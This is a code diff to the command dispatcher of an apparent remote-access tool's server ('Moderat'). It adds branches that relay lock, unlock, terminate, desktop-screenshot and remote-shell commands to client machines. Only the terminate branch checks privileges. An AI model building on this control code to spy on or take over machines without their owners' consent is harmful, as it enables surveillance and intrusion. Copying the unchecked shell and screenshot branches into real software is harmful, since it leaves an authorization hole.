@@ -365,13 +365,28 @@ class ModeratServerProtocol(Protocol):
             manageClients.set_moderator(client_id, moderator_id)
             log.info('Moderator Changed For Client (%s) to (%s)' % (client_id, moderator_id))
 
-        # Send Commands To Clients
-        elif data.has_key('mode'):
-            try:
-                log.info('Send Message to %s from %s' % (data['to'], data['from']))
-                self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
-            except KeyError:
-                pass
+
+        # Filters
+        # Terminating Client
+        elif data['mode'] == 'terminateClient' and manageModerators.get_privs(moderators[data['session_id']]['username']) == 1:
+            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
+            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
+        # Unlock Client
+        elif data['mode'] == 'unlockClient':
+            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
+            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
+        # Lock Client
+        elif data['mode'] == 'lockClient':
+            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
+            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
+        # Desktop Screenshot
+        elif data['mode'] == 'getScreen':
+            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
+            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
+        # Remote Shell
+        elif data['mode'] == 'shellMode':
+            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
+            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
 
         else:
             return
